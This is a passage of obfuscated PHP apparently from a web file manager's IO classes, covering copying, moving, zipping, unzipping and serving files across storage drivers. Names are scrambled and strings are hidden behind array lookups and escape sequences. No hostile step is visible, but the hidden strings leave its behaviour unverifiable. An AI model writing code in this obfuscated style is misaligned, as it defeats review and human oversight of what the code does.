$õ±ÔÈèº->pathThis($ãÏ±Êß) : $ÏÔŞÖ°; if ($ğ´½ØØ) { $µ œòğÊ = $Ğ”ÔÒ¾ß->fileNameExist($­Â‰¯»Ú, $ª÷›£); $ı®çóòø = $ª÷›£; $ª÷›£ = $Ğ”ÔÒ¾ß->fileNameAuto($­Â‰¯»Ú, $ª÷›£, $ğ´½ØØ, !$–¿‡£¯ç); if (!$µ œòğÊ || $ı®çóòø != $ª÷›£) { $ğ´½ØØ = !1; } if ($ëàÄöÎ && !$ğ´½ØØ) { $Ğ”ÔÒ¾ß->_data[$ÁÃ´¬éÖ[1238]] = !0; } } if ($–¿‡£¯ç) { return self::copyFile($õ±ÔÈèº, $ãÏ±Êß, $Ğ”ÔÒ¾ß, $­Â‰¯»Ú, $ª÷›£, $™˜—Ö¶); } if ($ğ´½ØØ == REPEAT_RENAME_FOLDER) { $ğ´½ØØ = !1; } $ËÚ¸˜¨ë = rtrim($­Â‰¯»Ú, $ÁÃ´¬éÖ[8]) . $ÁÃ´¬éÖ[8] . $ª÷›£; $ä ¬Ğöğ = $Ğ”ÔÒ¾ß->mkdir($Ğ”ÔÒ¾ß->getPath($ËÚ¸˜¨ë), $ğ´½ØØ); $­Â‰¯»Ú = $Ğ”ÔÒ¾ß->getPathInner($ä ¬Ğöğ); $Ğ©¿ Ú = $õ±ÔÈèº->listPath($ãÏ±Êß, !0); $Ğ©¿ Ú = is_array($Ğ©¿ Ú) ? $Ğ©¿ Ú : array($ÁÃ´¬éÖ[86] => array(), $ÁÃ´¬éÖ[85] => array()); $ã„³ù˜ğ = array_merge($Ğ©¿ Ú[$ÁÃ´¬éÖ[86]], $Ğ©¿ Ú[$ÁÃ´¬éÖ[85]]); foreach ($ã„³ù˜ğ as $Üº½üà‚) { $‘Ò×œçì = $Üº½üà‚[$ÁÃ´¬éÖ[33]] == $ÁÃ´¬éÖ[242]; $ãÏ±Êß = $õ±ÔÈèº->getPathInner($Üº½üà‚[$ÁÃ´¬éÖ[87]]); $¸ğ¢÷ÈË = self::copyPath($õ±ÔÈèº, $ãÏ±Êß, $Ğ”ÔÒ¾ß, $­Â‰¯»Ú, $ğ´½ØØ, $™˜—Ö¶, $‘Ò×œçì, !1, !1); if (!$¸ğ¢÷ÈË) { IO::errorTips($ÁÃ´¬éÖ[1239] . $ãÏ±Êß . $ÁÃ´¬éÖ[73] . $­Â‰¯»Ú); } } self::copyMoveKeepInfo($õ±ÔÈèº, $ãÏ±Êß, $ä ¬Ğöğ); return $ä ¬Ğöğ; } private static function copyFile($¾Ùóòò», $¿Â÷õâÉ, $ÀÁ§«œ¢, $Œ™÷çˆ, $˜È‹ØÇñ, $¶È¼„›) { $š¤Æğ¶ì =& $_SERVER[±³—úê]; $Œ™÷çˆ = $ÀÁ§«œ¢->getPath(rtrim($Œ™÷çˆ, $š¤Æğ¶ì[8]) . $š¤Æğ¶ì[8] . $˜È‹ØÇñ); $­ã¥Ã¡Ÿ = $š¤Æğ¶ì[1240] . time() . rand_string(5); Hook::trigger($š¤Æğ¶ì[1241], $¾Ùóòò», $¿Â÷õâÉ, $ÀÁ§«œ¢, $Œ™÷çˆ, $˜È‹ØÇñ, $­ã¥Ã¡Ÿ); if (self::driverIsSame($¾Ùóòò», $ÀÁ§«œ¢)) { if ($¶È¼„›) { $²ÍÀ³ = $ÀÁ§«œ¢->moveFile($¿Â÷õâÉ, $Œ™÷çˆ); } else { $²ÍÀ³ = $ÀÁ§«œ¢->copyFile($¿Â÷õâÉ, $Œ™÷çˆ); } Hook::trigger($š¤Æğ¶ì[1242], $¾Ùóòò», $¿Â÷õâÉ, $ÀÁ§«œ¢, $Œ™÷çˆ, $˜È‹ØÇñ, $²ÍÀ³); self::copyMoveKeepInfo($¾Ùóòò», $¿Â÷õâÉ, $²ÍÀ³); return $²ÍÀ³; } $¥“¸Ê¢å = TEMP_FILES; if ($GLOBALS[$š¤Æğ¶ì[6]][$š¤Æğ¶ì[92]][$š¤Æğ¶ì[877]]) { $¥“¸Ê¢å = $GLOBALS[$š¤Æğ¶ì[6]][$š¤Æğ¶ì[92]][$š¤Æğ¶ì[877]]; } $¥Ç™š = $¥“¸Ê¢å; mk_dir($¥Ç™š); $ßÑœİ‡€ = $¥Ç™š . $­ã¥Ã¡Ÿ; $‚ªç«é¢ = $ßÑœİ‡€; $ßÑœİ‡€ = $¾Ùóòò»->download($¿Â÷õâÉ, $ßÑœİ‡€); $ßÑœİ‡€ = $¾Ùóòò»->iconvApp($ßÑœİ‡€); if (substr($ßÑœİ‡€, strlen($¥“¸Ê¢å)) == $¥“¸Ê¢å) { $¶È¼„› = !0; } $²ÍÀ³ = $ÀÁ§«œ¢->upload($Œ™÷çˆ, $ßÑœİ‡€, $¶È¼„›); self::remove($‚ªç«é¢); Hook::trigger($š¤Æğ¶ì[1242], $¾Ùóòò», $¿Â÷õâÉ, $ÀÁ§«œ¢, $Œ™÷çˆ, $˜È‹ØÇñ, $²ÍÀ³); self::copyMoveKeepInfo($¾Ùóòò», $¿Â÷õâÉ, $²ÍÀ³); return $²ÍÀ³; } private static function copyMoveKeepInfo($´í‘˜¥, $®¹üÃÖ, $ı‹ÅŸã…) { if (!$ı‹ÅŸã…) { return; } $É¬Ãü¢ = $´í‘˜¥->info($®¹üÃÖ); if (!is_array($É¬Ãü¢)) { return; } IO::setModifyTime($ı‹ÅŸã…, $É¬Ãü¢[$_SERVER[±³—úê][88]]); } public static function pathFather($š¬ıÉ‘¯) { $˜çˆşÜ = IO::init($š¬ıÉ‘¯); $ï¬°«ˆ = $˜çˆşÜ->pathFather($˜çˆşÜ->path); return $˜çˆşÜ->getPathOuter($ï¬°«ˆ); } public static function fileOut($¢ò½å¨, $ùÒø”¯ = false, $ãËŞ‚Úæ = false, $èƒç†Ô = '') { $¹óÖŒŒÙ = self::driverMake($¢ò½å¨); if ($¹óÖŒŒÙ->isFileOutServer()) { return $¹óÖŒŒÙ->fileOutServer($¢ò½å¨, $ùÒø”¯, $ãËŞ‚Úæ, $èƒç†Ô); } return $¹óÖŒŒÙ->fileOut($¢ò½å¨, $ùÒø”¯, $ãËŞ‚Úæ, $èƒç†Ô); } public static function fileOutImage($ıºÏı¸û, $°ËÖ«½ = 250) { $±ÄŞ¶ = array(250, 600, 1200, 2000, 3000, 5000); for ($Õ±Á¯ = 0; $Õ±Á¯ < count($±ÄŞ¶); $Õ±Á¯++) { if ($Õ±Á¯ == 0 && $°ËÖ«½ <= $±ÄŞ¶[$Õ±Á¯]) { $°ËÖ«½ = $±ÄŞ¶[$Õ±Á¯]; break; } else { if ($°ËÖ«½ > $±ÄŞ¶[$Õ±Á¯ - 1] && $°ËÖ«½ <= $±ÄŞ¶[$Õ±Á¯]) { $°ËÖ«½ = $±ÄŞ¶[$Õ±Á¯]; break; } else { if ($Õ±Á¯ == count($±ÄŞ¶) - 1 && $°ËÖ«½ > $±ÄŞ¶[$Õ±Á¯]) { $°ËÖ«½ = $±ÄŞ¶[$Õ±Á¯]; break; } } } } $õ£ïªÖÙ = self::driverMake($ıºÏı¸û); if ($õ£ïªÖÙ->isFileOutServer()) { return $õ£ïªÖÙ->fileOutImageServer($ıºÏı¸û, $°ËÖ«½); } return $õ£ïªÖÙ->fileOutImage($ıºÏı¸û, $°ËÖ«½); } private static function driverIsSame($«Œ“ê«, $šãŞô½„) { $ø¯Ë¿Ìê =& $_SERVER[±³—úê]; $ˆ¾ÎËÕ£ = $«Œ“ê«->getType(); $ñ¹Úæ˜É = $šãŞô½„->getType(); if ($ˆ¾ÎËÕ£ != $ñ¹Úæ˜É) { return !1; } if ($ˆ¾ÎËÕ£ == $ø¯Ë¿Ìê[837]) { return !0; } if ($ˆ¾ÎËÕ£ == $ø¯Ë¿Ìê[109]) { return !0; } if ($«Œ“ê«->pathDriver == $šãŞô½„->pathDriver) { return !0; } return !1; } public static function copyUpdate($´±çââõ, $‰ãÉÎ) { $ ¡ş®Ó… =& $_SERVER[±³—úê]; if (!IO::exist($´±çââõ)) { return !1; } if (!IO::exist($‰ãÉÎ)) { IO::mkdir($‰ãÉÎ); } $‰ÜÑÔìó = array_to_keyvalue(self::listAllSimple($´±çââõ), $ ¡ş®Ó…[87]); $¢®§‚Ï˜ = array_to_keyvalue(self::listAllSimple($‰ãÉÎ), $ ¡ş®Ó…[87]); $¼Œ‡†Ãæ = array(); $”“ğ‚ø´ = array(); foreach ($‰ÜÑÔìó as $™¾¿Õ«— => $ÛÒçìº¶) { if (isset($¢®§‚Ï˜[$™¾¿Õ«—])) { if ($ÛÒçìº¶[$ ¡ş®Ó…[78]] == 1) { continue; } if ($¢®§‚Ï˜[$™¾¿Õ«—][$ ¡ş®Ó…[79]] == $ÛÒçìº¶[$ ¡ş®Ó…[79]]) { continue; } } if ($ÛÒçìº¶[$ ¡ş®Ó…[78]] == 1) { $”“ğ‚ø´[] = $‰ãÉÎ . $ ¡ş®Ó…[8] . trim($™¾¿Õ«—, $ ¡ş®Ó…[8]); continue; } $Ğ®…Ú¥ = strstr(trim($™¾¿Õ«—, $ ¡ş®Ó…[8]), $ ¡ş®Ó…[8]) ? get_path_father($™¾¿Õ«—) : $ ¡ş®Ó…[12]; $¼Œ‡†Ãæ[] = array($ ¡ş®Ó…[1243] => $ÛÒçìº¶[$ ¡ş®Ó…[89]], $ ¡ş®Ó…[1244] => rtrim($‰ãÉÎ, $ ¡ş®Ó…[8]) . $ ¡ş®Ó…[8] . $Ğ®…Ú¥, $ ¡ş®Ó…[1245] => $ÛÒçìº¶); } $ƒ±ïìŞ» = array($ ¡ş®Ó…[242] => $¼Œ‡†Ãæ, $ ¡ş®Ó…[78] => $”“ğ‚ø´); Hook::trigger($ ¡ş®Ó…[1246], $´±çââõ, $‰ãÉÎ, $ƒ±ïìŞ»); foreach ($”“ğ‚ø´ as $ÛÒçìº¶) { IO::mkdir($ÛÒçìº¶); } foreach ($¼Œ‡†Ãæ as $ÛÒçìº¶) { IO::copy($ÛÒçìº¶[$ ¡ş®Ó…[1243]], $ÛÒçìº¶[$ ¡ş®Ó…[1244]], REPEAT_REPLACE); } } public static function fileSubstr($Ü±¥ÎÃ², $Ÿ£œšÖ¨, $İØ£ìËû = false) { $”ï™ƒÌ =& $_SERVER[±³—úê]; $¹Ò¼ÁòÕ = self::driverMake($Ü±¥ÎÃ²); $îÎãÑ«ô = $¹Ò¼ÁòÕ->size($Ü±¥ÎÃ²); $ƒ³Ç¼× = $Ÿ£œšÖ¨; $ğô­ë» = $İØ£ìËû; if ($Ÿ£œšÖ¨ < 0) { $Ÿ£œšÖ¨ = $îÎãÑ«ô + $Ÿ£œšÖ¨; } if ($İØ£ìËû === !1) { $İØ£ìËû = $îÎãÑ«ô - $Ÿ£œšÖ¨; } if ($Ÿ£œšÖ¨ + $İØ£ìËû > $îÎãÑ«ô) { $İØ£ìËû = $îÎãÑ«ô - $Ÿ£œšÖ¨; } if (!$îÎãÑ«ô && $¹Ò¼ÁòÕ->getType() == $”ï™ƒÌ[109] && !$¹Ò¼ÁòÕ->exist($Ü±¥ÎÃ²)) { $ Æòñ½ı = get_path_this($Ü±¥ÎÃ²); $¹Š˜ÖŒ = parse_url_query($ Æòñ½ı); if (is_array($¹Š˜ÖŒ) && isset($¹Š˜ÖŒ[$”ï™ƒÌ[32]])) { $ Æòñ½ı = urldecode($¹Š˜ÖŒ[$”ï™ƒÌ[32]]); } throw new Exception($”ï™ƒÌ[1247] . LNG($”ï™ƒÌ[1248]) . $”ï™ƒÌ[1045] . clear_html($ Æòñ½ı) . $”ï™ƒÌ[12]); } if ($İØ£ìËû <= 0) { return $”ï™ƒÌ[12]; } if ($Ÿ£œšÖ¨ < 0 || $Ÿ£œšÖ¨ >= $îÎãÑ«ô || $İØ£ìËû > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\145\122\x65\x61\144\40\145\x72\162\x6f\x72\x21\40\x73\x74\141\x72\164\75{$Ÿ£œšÖ¨}\x3b\154\x65\x6e\x67\x74\x68\x3d{$İØ£ìËû}\73\x20\163\x69\x7a\145\x3d{$îÎãÑ«ô}\73"); } $í“ê“Ê¤ = $¹Ò¼ÁòÕ->fileSubstr($Ü±¥ÎÃ², $Ÿ£œšÖ¨, $İØ£ìËû); if (!$í“ê“Ê¤ && $İØ£ìËû && isset($GLOBALS[$”ï™ƒÌ[1249]])) { throw new Exception($GLOBALS[$”ï™ƒÌ[1249]][$”ï™ƒÌ[1250]]); } return $í“ê“Ê¤; } private static function driverMake(&$İØÌ Æ) { $«µ°€¨ß =& $_SERVER[±³—úê]; $ëÙïññÚ = KodIO::parse($İØÌ Æ); if (!self::$driverListSystem) { $À÷ßàïƒ = Model($«µ°€¨ß[847])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($À÷ßàïƒ, $«µ°€¨ß[486]); } if ($ëÙïññÚ[$«µ°€¨ß[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ëÙïññÚ[$«µ°€¨ß[486]]]) { throw new Exception($«µ°€¨ß[1251]); return !1; } $İØÌ Æ = $ëÙïññÚ[$«µ°€¨ß[1252]]; $©—Ôé‘§ = self::driverGet($ëÙïññÚ, $İØÌ Æ); return $©—Ôé‘§; } private static function driverGet($»€•ş, &$äà—Õ±â) { $¹§­ØÌ¤ =& $_SERVER[±³—úê]; $Á×íÑ”ı = $»€•ş[$¹§­ØÌ¤[1253]]; $Ãª™‹Àê = $»€•ş[$¹§­ØÌ¤[486]]; switch ($»€•ş[$¹§­ØÌ¤[33]]) { case KodIO::KOD_IO: $‚çúÖëô = self::$driverListSystem[$Ãª™‹Àê]; break; case KodIO::KOD_SOURCE: $äà—Õ±â = $Ãª™‹Àê . $äà—Õ±â; $‚çúÖëô = array($¹§­ØÌ¤[1254] => $¹§­ØÌ¤[1255], $¹§­ØÌ¤[6] => $»€•ş); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ï‘ÏÜ£­ = $GLOBALS[$¹§­ØÌ¤[1256]]; self::$driverListUser = array_to_keyvalue($ï‘ÏÜ£­, $¹§­ØÌ¤[486]); } $‚çúÖëô = self::$driverListUser[$Ãª™‹Àê]; break; case KodIO::KOD_SHARE_LINK: $‚çúÖëô = array($¹§­ØÌ¤[1254] => $¹§­ØÌ¤[1257], $¹§­ØÌ¤[6] => $»€•ş); $¨‘™ÑŒè = Action($¹§­ØÌ¤[1258])->sharePathInfo($»€•ş[$¹§­ØÌ¤[87]]); $äà—Õ±â = $¨‘™ÑŒè[$¹§­ØÌ¤[193]]; if (!$¨‘™ÑŒè[$¹§­ØÌ¤[193]]) { $¯€Äº±Ğ = Model($¹§­ØÌ¤[678])->getInfo($¨‘™ÑŒè[$¹§­ØÌ¤[679]]); $äà—Õ±â = KodIO::clear($¯€Äº±Ğ[$¹§­ØÌ¤[1259]] . $»€•ş[$¹§­ØÌ¤[1252]]); $»€•ş[$¹§­ØÌ¤[571]] = $¯€Äº±Ğ; $»€•ş[$¹§­ØÌ¤[1234]] = $äà—Õ±â; $‚çúÖëô = array($¹§­ØÌ¤[1254] => $¹§­ØÌ¤[1260], $¹§­ØÌ¤[6] => $»€•ş); } break; case KodIO::KOD_SHARE_ITEM: $‚çúÖëô = array($¹§­ØÌ¤[1254] => $¹§­ØÌ¤[1261], $¹§­ØÌ¤[6] => $»€•ş); $¯€Äº±Ğ = Model($¹§­ØÌ¤[678])->getInfo($»€•ş[$¹§­ØÌ¤[486]]); if ($¯€Äº±Ğ[$¹§­ØÌ¤[193]] == $¹§­ØÌ¤[240]) { $äà—Õ±â = KodIO::clear($¯€Äº±Ğ[$¹§­ØÌ¤[1259]] . $»€•ş[$¹§­ØÌ¤[1252]]); $»€•ş[$¹§­ØÌ¤[571]] = $¯€Äº±Ğ; $»€•ş[$¹§­ØÌ¤[1234]] = $äà—Õ±â; $‚çúÖëô = array($¹§­ØÌ¤[1254] => $¹§­ØÌ¤[1262], $¹§­ØÌ¤[6] => $»€•ş); } else { if (!$äà—Õ±â) { $äà—Õ±â = $¯€Äº±Ğ[$¹§­ØÌ¤[193]]; } } break; default: $äà—Õ±â = $»€•ş[$¹§­ØÌ¤[87]]; $‚çúÖëô = array($¹§­ØÌ¤[1254] => $¹§­ØÌ¤[1263]); break; } $òşí˜Ë = $»€•ş[$¹§­ØÌ¤[87]]; if (!isset(self::$driverCache[$òşí˜Ë])) { $¡– ¯«ğ = strtolower($‚çúÖëô[$¹§­ØÌ¤[98]]); $› áÛ„¬ = $GLOBALS[$¹§­ØÌ¤[6]][$¹§­ØÌ¤[92]][$¹§­ØÌ¤[906]]; $Ö¡Šğáì = $¹§­ØÌ¤[77] . (isset($› áÛ„¬[$¡– ¯«ğ]) ? $› áÛ„¬[$¡– ¯«ğ] : ucfirst($¡– ¯«ğ)); if (!class_exists($Ö¡Šğáì)) { show_json("{$Ö¡Šğáì}\40\x6e\x6f\164\40\145\170\x69\163\x74\163\41", !1); } $ï§…ÅÈ¶ = isset($‚çúÖëô[$¹§­ØÌ¤[6]]) ? $‚çúÖëô[$¹§­ØÌ¤[6]] : !1; self::$driverCache[$òşí˜Ë] = new $Ö¡Šğáì($ï§…ÅÈ¶); } $¶üäŒÎ = self::$driverCache[$òşí˜Ë]; $¶üäŒÎ->pathDriver = $Á×íÑ”ı; $¶üäŒÎ->pathBase = $¹§­ØÌ¤[12]; if (isset($‚çúÖëô[$¹§­ØÌ¤[6]][$¹§­ØÌ¤[1264]])) { $¶üäŒÎ->pathBase = rtrim($‚çúÖëô[$¹§­ØÌ¤[6]][$¹§­ØÌ¤[1264]], $¹§­ØÌ¤[8]) . $¹§­ØÌ¤[8]; $äà—Õ±â = $¶üäŒÎ->pathBase . ltrim($äà—Õ±â, $¹§­ØÌ¤[8]); } $äà—Õ±â = $¶üäŒÎ->getPath($äà—Õ±â); if (isset($»€•ş[$¹§­ØÌ¤[1234]])) { $äà—Õ±â = $»€•ş[$¹§­ØÌ¤[1234]]; } $¶üäŒÎ->path = $äà—Õ±â; return $¶üäŒÎ; } public static function errorTips($ÔÒËÔ¸Š = false) { $÷õĞÒ²  =& $_SERVER[±³—úê]; static $‹Å•‹Úç = array(); $Ê—á¿è = 1000; if ($ÔÒËÔ¸Š === -1) { return $‹Å•‹Úç ? $‹Å•‹Úç[count($‹Å•‹Úç) - 1] : $÷õĞÒ² [12]; } if ($ÔÒËÔ¸Š === !1) { return implode($÷õĞÒ² [221], $‹Å•‹Úç); } if (count($‹Å•‹Úç) >= $Ê—á¿è) { $‹Å•‹Úç = array_slice($‹Å•‹Úç, $Ê—á¿è * 0.5, $Ê—á¿è); } $‹Å•‹Úç[] = $ÔÒËÔ¸Š; write_log($÷õĞÒ² [176] . ACTION . $÷õĞÒ² [1265] . $ÔÒËÔ¸Š, $÷õĞÒ² [1266]); } public static function getLastError($ÒåÑ¦°® = '') { $É¬ëÓ = self::errorTips(-1); return $É¬ëÓ ? $É¬ëÓ : $ÒåÑ¦°®; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $øê•¸ïÌ; if ($øê•¸ïÌ) { return $øê•¸ïÌ; } $Ú¯Ş‚ = IO::init($_SERVER[±³—úê][8]); return $Ú¯Ş‚; } private static function iconvSystem($²œâŸè) { return self::local()->iconvSystem($²œâŸè); } private static function iconvApp($ñ¼˜œ “) { return self::local()->iconvApp($ñ¼˜œ “); } public static function zipFolder($ğµ³‹Ó§, $õ‡ÜŠ— = "\172\151\x70", $ÍêÇ Â = '', $É°×ç×” = REPEAT_RENAME) { $‡‰˜„§ =& $_SERVER[±³—úê]; $ŞóÂş¯½ = IO::listPath($ğµ³‹Ó§); if (!$ŞóÂş¯½) { return !1; } $ŞóÂş¯½ = array_merge($ŞóÂş¯½[$‡‰˜„§[85]], $ŞóÂş¯½[$‡‰˜„§[86]]); return self::zip($ŞóÂş¯½, $õ‡ÜŠ—, $ÍêÇ Â, $É°×ç×”); } public static function zip($±Âëıı, $Š‰ÔŠòÙ = "\172\x69\160", $–ÚÙÏúä = '', $¤ö‘À÷· = REPEAT_RENAME) { $³©Òï =& $_SERVER[±³—úê]; if (is_string($±Âëıı) && $±Âëıı) { $±Âëıı = array(array($³©Òï[87] => $±Âëıı)); } $”æûÙ¼ = self::init($±Âëıı[0][$³©Òï[87]]); $µşì¦ñ¸ = self::info($±Âëıı[0][$³©Òï[87]]); $µì¿Ğò’ = $³©Òï[12]; $ËœŠŞ¶ì = $³©Òï[12]; $‰ı›­æÀ = $³©Òï[12]; if ($–ÚÙÏúä && substr($–ÚÙÏúä, -1, 1) != $³©Òï[8]) { $ËœŠŞ¶ì = get_path_father($–ÚÙÏúä); $‰ı›­æÀ = get_path_this($–ÚÙÏúä); } else { $ËœŠŞ¶ì = self::pathFather($µşì¦ñ¸[$³©Òï[87]]); $‰ı›­æÀ = $µşì¦ñ¸[$³©Òï[32]] . $³©Òï[10] . $Š‰ÔŠòÙ; if (count($±Âëıı) > 1) { $ˆ¯ÀŠ¥Ç = IO::info($ËœŠŞ¶ì); $‰ı›­æÀ = $ˆ¯ÀŠ¥Ç[$³©Òï[32]] . $³©Òï[10] . $Š‰ÔŠòÙ; } if ($–ÚÙÏúä) { $ËœŠŞ¶ì = $–ÚÙÏúä; } } if ($”æûÙ¼->getType() == $³©Òï[109]) { $Óô”…ôİ = self::init($ËœŠŞ¶ì); $åİ³áí— = $Óô”…ôİ->getType() == $³©Òï[109] ? $ËœŠŞ¶ì : get_path_father($”æûÙ¼->path); $åİ³áí— = rtrim($åİ³áí—, $³©Òï[8]) . $³©Òï[8]; mk_dir($åİ³áí—); } else { $µì¿Ğò’ = TEMP_FILES . $³©Òï[1267] . time() . rand_string(8) . $³©Òï[8]; mk_dir($µì¿Ğò’); file_put_contents($µì¿Ğò’ . $³©Òï[1268], $³©Òï[12]); $åİ³áí— = $µì¿Ğò’; } $¥Ö®ÆÌØ = IO::info($åİ³áí—); if (!$¥Ö®ÆÌØ || !$¥Ö®ÆÌØ[$³©Òï[245]]) { show_json(LNG($³©Òï[1269]), !1); } $»ÓŠÇ°¡ = self::zipFileList($±Âëıı, $µì¿Ğò’); foreach ($»ÓŠÇ°¡ as $ØíÑú¬ó => $¦èŸâ·È) { $»ÓŠÇ°¡[$ØíÑú¬ó] = self::iconvSystem($¦èŸâ·È); } $ÅÎÉàÔ» = get_filename_auto($åİ³áí— . $‰ı›­æÀ, $³©Òï[12], $¤ö‘À÷·); KodArchive::create(self::iconvSystem($ÅÎÉàÔ»), $»ÓŠÇ°¡); if (!IO::exist($ÅÎÉàÔ»)) { if ($µì¿Ğò’) { del_dir($µì¿Ğò’); } write_log($³©Òï[1270] . $ÅÎÉàÔ», $³©Òï[399]); show_json(LNG($³©Òï[1271]), !1); } if (!$µì¿Ğò’) { return $ÅÎÉàÔ»; } $ü´™œ­ = self::move($ÅÎÉàÔ», $ËœŠŞ¶ì, $¤ö‘À÷·); if ($µì¿Ğò’) { del_dir($µì¿Ğò’); } if (!$ÅÎÉàÔ») { write_log($³©Òï[1272] . $ÅÎÉàÔ» . $³©Òï[1273] . $ËœŠŞ¶ì, $³©Òï[399]); show_json(LNG($³©Òï[1271]), !1); } return $ü´™œ­; } public static function unzip($ü„‡åáò, $ÆŞıë, $£òÅè¢ô = "\x2d\x31", $—È”ÍÑõ = "\x72\145\x70\x6c\x61\143\x65") { $²³ùµõè =& $_SERVER[±³—úê]; $Õı‡­– = parent::info($ü„‡åáò); if (!$Õı‡­–) { show_json(LNG($²³ùµõè[1274]), !1); } $ŸŸä×¢ß = IO::infoFullSimple($ÆŞıë); if (!$ŸŸä×¢ß) { $ÆŞıë = IO::mkdir($ÆŞıë); } if (isset($ŸŸä×¢ß[$²³ùµõè[193]]) && trim($ŸŸä×¢ß[$²³ùµõè[87]], $²³ùµõè[8]) != trim($ÆŞıë, $²³ùµõè[8])) { $—ÂË¨äï = KodIO::make($ŸŸä×¢ß[$²³ùµõè[192]]); $ç×ØÈÉ• = IO::fileNameAuto($—ÂË¨äï, $ŸŸä×¢ß[$²³ùµõè[32]], REPEAT_RENAME_FOLDER, !0); $ÆŞıë = IO::mkdir($—ÂË¨äï . $ç×ØÈÉ•); } $£òÅè¢ô = $£òÅè¢ô && $£òÅè¢ô != $²³ùµõè[1275] ? @json_decode($£òÅè¢ô, !0) : -1; $ŒàÂ‘¥ = self::unzipPart($ü„‡åáò, $£òÅè¢ô); if (!$ŒàÂ‘¥ || !IO::exist($ŒàÂ‘¥[$²³ùµõè[242]])) { show_json(LNG($²³ùµõè[108]), !1); } $ä€¼ = $ŒàÂ‘¥[$²³ùµõè[1276]][count($ŒàÂ‘¥[$²³ùµõè[1276]]) - 1]; if ($ä€¼[$²³ùµõè[1277]] == -1 || substr($ä€¼[$²³ùµõè[32]], -1, 1) == $²³ùµõè[8]) { $äÙùó± = $ŒàÂ‘¥[$²³ùµõè[1278]] . rand_string(10) . $²³ùµõè[8]; mk_dir($äÙùó±); $œÕÅÄŞ = count($ŒàÂ‘¥[$²³ùµõè[1276]]) == 1 ? IO::ext($ü„‡åáò) : get_path_ext($ŒàÂ‘¥[$²³ùµõè[242]]); $×Ëï¹ = KodArchive::extract(self::iconvSystem($ŒàÂ‘¥[$²³ùµõè[242]]), $äÙùó±, $ä€¼[$²³ùµõè[1277]], $ç×ØÈÉ•, $œÕÅÄŞ); self::unzipErrorCheck($×Ëï¹, array($²³ùµõè[1279], $ü„‡åáò, $œÕÅÄŞ, $ÆŞıë, $ŒàÂ‘¥)); Hook::trigger($²³ùµõè[1280], $äÙùó±); recursion_dir($äÙùó±, $¶©Ï¬‡ª, $¹²ÙÒÍÎ, 0); $›É°Ú±ï = array_merge($¶©Ï¬‡ª, $¹²ÙÒÍÎ); $æÊÁãæç = array(); foreach ($›É°Ú±ï as $ÅÚô˜ùü) { $Æ¦´ËÛ× = IO::move(self::iconvApp($ÅÚô˜ùü), $ÆŞıë, $—È”ÍÑõ); if ($Æ¦´ËÛ×) { $æÊÁãæç[] = $Æ¦´ËÛ×; } } del_dir($äÙùó±); } else { $Æ¦´ËÛ× = IO::move($ŒàÂ‘¥[$²³ùµõè[242]], $ÆŞıë, $—È”ÍÑõ, get_path_this($ä€¼[$²³ùµõè[32]])); if ($Æ¦´ËÛ×) { $æÊÁãæç[] = $Æ¦´ËÛ×; } } return $æÊÁãæç ? $æÊÁãæç : !1; } public static function unzipList($”ÓùÄÖ½) { $÷æ¥•Ô° =& $_SERVER[±³—úê]; $‹èÕÆÓ = isset($”ÓùÄÖ½[$÷æ¥•Ô°[1281]]) ? $”ÓùÄÖ½[$÷æ¥•Ô°[1281]] : !1; $ÃµÜˆõŞ = isset($”ÓùÄÖ½[$÷æ¥•Ô°[1277]]) ? @json_decode($”ÓùÄÖ½[$÷æ¥•Ô°[1277]], !0) : -1; $¶È­¡Àø = self::unzipPart($”ÓùÄÖ½[$÷æ¥•Ô°[87]], $ÃµÜˆõŞ); if (!$¶È­¡Àø || !IO::exist($¶È­¡Àø[$÷æ¥•Ô°[242]])) { show_json(LNG($÷æ¥•Ô°[108]), !1); } $Ô‘Èİà‰ = $¶È­¡Àø[$÷æ¥•Ô°[1276]][count($¶È­¡Àø[$÷æ¥•Ô°[1276]]) - 1]; $ˆæÂ™ş¤ = in_array(IO::ext($¶È­¡Àø[$÷æ¥•Ô°[242]]), array($÷æ¥•Ô°[399], $÷æ¥•Ô°[1282], $÷æ¥•Ô°[1283], $÷æ¥•Ô°[1284], $÷æ¥•Ô°[1285], $÷æ¥•Ô°[1286])); if (!$‹èÕÆÓ && ($Ô‘Èİà‰[$÷æ¥•Ô°[1277]] == -1 || $ˆæÂ™ş¤)) { $ÆÊ¯ğåë = $¶È­¡Àø[$÷æ¥•Ô°[1278]] . get_path_this($¶È­¡Àø[$÷æ¥•Ô°[242]]) . $÷æ¥•Ô°[1287]; if (!IO::exist($ÆÊ¯ğåë)) { $¶ØÇ– = $Ô‘Èİà‰[$÷æ¥•Ô°[1277]] == -1 ? get_path_ext(IO::pathThis($”ÓùÄÖ½[$÷æ¥•Ô°[87]])) : get_path_ext($¶È­¡Àø[$÷æ¥•Ô°[242]]); $³¹½À· = KodArchive::listContent(self::iconvSystem($¶È­¡Àø[$÷æ¥•Ô°[242]]), !0, $¶ØÇ–); self::unzipErrorCheck($³¹½À·, array($÷æ¥•Ô°[1288], $”ÓùÄÖ½, $¶È­¡Àø)); @file_put_contents($ÆÊ¯ğåë, json_encode($³¹½À·[$÷æ¥•Ô°[1289]])); } return @json_decode(IO::getContent($ÆÊ¯ğåë), !0); } IO::fileOut($¶È­¡Àø[$÷æ¥•Ô°[242]], $‹èÕÆÓ, get_path_this($Ô‘Èİà‰[$÷æ¥•Ô°[32]])); die; } private static function zipFileList($ŒŠÇõ, $°ä©£¾Í = false) { $œƒ•¶Ğ¡ =& $_SERVER[±³—úê]; $Æ‘ì’Ú¹ = array(); foreach ($ŒŠÇõ as $“‰ô½ÛÖ) { $óïè‹ü  = $“‰ô½ÛÖ[$œƒ•¶Ğ¡[87]]; if ($°ä©£¾Í) { $óïè‹ü  = self::copy($“‰ô½ÛÖ[$œƒ•¶Ğ¡[87]], $°ä©£¾Í, $œƒ•¶Ğ¡[899]); } else { $š‚®Ôâ” = self::init($“‰ô½ÛÖ[$œƒ•¶Ğ¡[87]]); if ($š‚®Ôâ”->getType() == $œƒ•¶Ğ¡[109]) { $óïè‹ü  = $š‚®Ôâ”->path; } } if ($óïè‹ü  && self::local()->exist($óïè‹ü )) { $Æ‘ì’Ú¹[$“‰ô½ÛÖ[$œƒ•¶Ğ¡[87]]] = $óïè‹ü ; } } if (!empty($Æ‘ì’Ú¹)) { return array_values($Æ‘ì’Ú¹); } show_json(LNG($œƒ•¶Ğ¡[1248]), !1); } private static 